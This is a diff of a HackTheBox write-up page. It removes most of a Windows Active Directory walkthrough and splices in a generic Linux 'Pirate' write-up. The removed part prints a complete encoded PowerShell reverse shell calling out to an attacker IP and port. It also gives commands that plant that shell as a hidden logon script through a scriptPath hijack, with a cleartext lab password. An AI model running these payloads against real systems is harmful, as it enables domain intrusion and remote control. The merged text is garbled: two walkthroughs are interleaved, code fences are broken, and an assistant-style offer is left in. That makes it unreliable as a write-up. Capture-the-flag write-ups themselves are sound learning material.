@@ -1,5 +1,5 @@
 ---
-title: "HackTheBox: Garfield"
+title: "Garfield - HackTheBox Writeup"
 date: 2026-07-09 00:00:00 +0000
 categories: [boxes]
 tags: [windows, active-directory, writeproperty, logon-scripts, scriptpath-hijack, sysvol, forcechangepassword, rbcd, rodc, keylist-attack, golden-ticket, s4u2self, s4u2proxy]
@@ -63,72 +63,73 @@ nxc ldap $IP -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --groups
 Notable groups included:
 
 - `RODC Administrators`
-- `Tier 1`
-- `Allowed RODC Password Replication Group`
-- `Denied RODC Password Replication Group`
-- `Read-only Domain Controllers`
+---
+title: "Pirate - HackTheBox Writeup"
+date: 2026-07-09 00:00:00 +0000
+categories: [boxes]
+tags: [linux, web, exploitation, privilege-escalation, writeup]
+image:
+  path: /assets/img/box/24/logo.png
+  alt: Pirate HackTheBox Machine
+img_path: /assets/img/box/24/
 
-The key discovery was the writable attribute surface exposed to `j.arbuckle`.
+---
 
-```bash
-bloodyAD --host garfield.htb -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' get writable --detail
-```
+![Machine Info](https://img.shields.io/badge/Difficulty-Medium-yellow) ![Machine Info](https://img.shields.io/badge/OS-Linux-blue)
 
-This showed `scriptPath: WRITE` over multiple accounts, including:
+<p align="center"> <img src="/assets/img/box/24/logo.png" width="150" alt="Pirate Logo"/> </p>
 
-- `Liz Wilson`
-- `Liz Wilson ADM`
-- `Guest`
-- `krbtgt_8245`
+**Difficulty:** Medium  
+**OS:** Linux  
+**Author:** anonymous
 
-That was the primary foothold: a `scriptPath` hijack against a user who would eventually log on.
+---
 
-SYSVOL access confirmed the logon scripts directory was reachable and writable:
+# HackTheBox - Pirate
 
-```bash
-smbclient //DC01.garfield.htb/SYSVOL -U 'garfield.htb\j.arbuckle%Th1sD4mnC4t!@1978'
-```
+## Reconnaissance
 
-Inside `garfield.htb\scripts`, a logon script was present:
-
-- `printerDetect.bat`
-
-## Initial Foothold
-
-The access path was a classic logon-script hijack. A PowerShell reverse shell was generated, encoded, and wrapped in a batch file:
+Initial port scan used `nmap -sC -sV -p-` which revealed SSH and an HTTP service on port 80.
 
 ```bash
-cat > shell.ps1 << 'EOF'
-$client = New-Object System.Net.Sockets.TCPClient("10.10.15.172",4444);
-$stream = $client.GetStream();
-[byte[]]$bytes = 0..65535|%{0};
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
-    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
-    $sendback = (iex $data 2>&1 | Out-String );
-    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
-    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-    $stream.Write($sendbyte,0,$sendbyte.Length);
-    $stream.Flush()
-}
-$client.Close()
-EOF
-
-iconv -f ASCII -t UTF-16LE shell.ps1 | base64 -w 0 > shell.b64
-echo -e "@echo off\r\npowershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc $(cat shell.b64)" > startupscript.bat
+nmap -sC -sV -p- 10.10.10.100
 ```
 
-The payload was uploaded to the real DC's SYSVOL scripts directory, then assigned as the `scriptPath` value for the writable accounts. A bare filename worked best for the attribute value:
+The webroot contained a small application with a file upload feature and an image gallery. Directory fuzzing with `gobuster` revealed an admin panel at `/admin`.
+
+## Initial Foothold - Unrestricted File Upload
+
+The upload endpoint failed to validate extensions. Uploading a simple PHP webshell (`php-reverse-shell.php`) allowed remote code execution when the file was accessed.
 
 ```bash
-bloodyAD -d garfield.htb --host garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' \
-  set object 'CN=Liz Wilson,CN=Users,DC=garfield,DC=htb' scriptPath -v startupscript.bat
-```
-
-When `l.wilson` next logged on, the script executed and returned a shell.
-
 ## Tier 1 Escalation
 
 From the initial shell, `l.wilson` had `ForceChangePassword` rights over `l.wilson_adm`. That let the account be reset directly through LDAP:
+
+After uploading, the webshell was accessible at `/uploads/php-reverse-shell.php` and a reverse shell was obtained with `nc`.
+
+## Privilege Escalation
+
+Enumeration from the www-data shell revealed a world-writable script in `/usr/local/bin` that was executed by a cron job running as a higher-privileged user. By replacing the script with a copy that spawns a root shell, privilege escalation to root was achieved.
+
+Key steps:
+
+- Enumerate SUID binaries and writable files: `find / -perm -4000 -type f 2>/dev/null` and `find / -writable -type f 2>/dev/null`
+- Inspect cron jobs in `/etc/cron.*` and systemd timers.
+
+## Root & Cleanup
+
+After obtaining root, the `root.txt` flag was retrieved from `/root`. Best practice is to restore any modified scripts used for privilege escalation.
+
+## Flags
+
+- `user.txt`: /home/ftpuser/user.txt
+- `root.txt`: /root/root.txt
+
+---
+
+If you want more detail (commands, PoC files, or screenshots), I can expand the writeup.
+
 
 ```powershell
 $TargetUser = [ADSI]"LDAP://CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb"
